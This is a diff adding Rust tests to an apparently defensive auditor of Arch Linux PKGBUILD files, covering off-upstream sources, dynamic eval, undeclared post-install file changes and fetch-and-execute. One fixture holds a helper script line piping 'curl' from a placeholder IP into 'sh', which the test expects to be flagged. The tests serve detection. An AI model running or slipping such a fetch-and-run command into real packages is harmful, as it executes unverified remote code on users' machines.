@@ -166,6 +166,80 @@ fn a_release_on_the_projects_own_code_host_repo_is_upstream() {
 }
 
 #[test]
+fn same_host_other_owner_needs_a_pin() {
+    let head =
+        "pkgname=mozc\npkgver=1\npkgrel=1\narch=(x86_64)\nurl=https://github.com/fcitx/mozc\n";
+    let pinned = format!(
+        "{head}source=(https://github.com/abseil/abseil/archive/v1.tar.gz)\nsha256sums=({SUM})\n"
+    );
+    assert_eq!(laws(&pinned, None), []);
+    let floating =
+        format!("{head}source=(git+https://github.com/stranger/patches.git)\nsha256sums=(SKIP)\n");
+    assert_eq!(laws(&floating, None), [L::SourceOffUpstream]);
+}
+
+#[test]
+fn a_floating_vcs_source_on_a_known_forge_is_declared_tracking() {
+    let p = "pkgname=mesa-git\npkgver=1\npkgrel=1\narch=(x86_64)\nurl=https://www.mesa3d.org/\nsource=('mesa::git+https://gitlab.freedesktop.org/mesa/mesa.git#branch=main')\nsha256sums=(SKIP)\nbuild() { cd mesa; meson setup build; }\n";
+    assert_eq!(laws(p, None), []);
+}
+
+#[test]
+fn one_origin_is_one_finding() {
+    let r = audit_text(
+        &pkg(
+            "source=(https://example.org/a.tar.gz)\nsha256sums=(SKIP)\nbuild() { cd a; meson setup b; meson compile -C b; meson test -C b; }",
+        ),
+        None,
+    );
+    assert_eq!(r.findings.len(), 1, "{:#?}", r.findings);
+    let r = audit_text(
+        &pkg("for p in a b c; do eval \"package_$p() { $(declare -f x); }\"; done"),
+        None,
+    );
+    assert_eq!(
+        r.findings
+            .iter()
+            .filter(|f| f.law == L::UnresolvedDynamic)
+            .count(),
+        1,
+        "{:#?}",
+        r.findings
+    );
+}
+
+#[test]
+fn a_helper_named_through_bash_source_is_followed() {
+    let mut files = std::collections::HashMap::new();
+    files.insert(
+        "fix.sh".to_owned(),
+        "curl -s http://203.0.113.9/x | sh\n".to_owned(),
+    );
+    let p = pkg("package() { source \"$(dirname \"${BASH_SOURCE[0]}\")/fix.sh\"; }");
+    let r = aurlaws::judge_files(&p, &files);
+    let got: Vec<L> = r.findings.iter().map(|f| f.law).collect();
+    assert_eq!(got, [L::FetchExecuteUnverified], "{:#?}", r.findings);
+}
+
+#[test]
+fn metadata_changes_wait_for_the_real_file_list() {
+    let i = "post_install() { setcap cap_net_raw+ep /usr/bin/demo; chgrp wheel /opt/Demo/x; }\n";
+    assert_eq!(laws(&pkg(""), Some(i)), []);
+    let e = aurlaws::Evidence {
+        package_files: vec!["/usr/bin/other".into()],
+        ..Default::default()
+    };
+    let r = aurlaws::audit_text_with(&pkg(""), Some(i), &e);
+    assert!(
+        r.findings
+            .iter()
+            .any(|f| f.law == L::ScriptletUndeclaredFile),
+        "{:#?}",
+        r.findings
+    );
+}
+
+#[test]
 fn postinstall_stays_off_the_network() {
     let got = laws(
         &pkg(""),
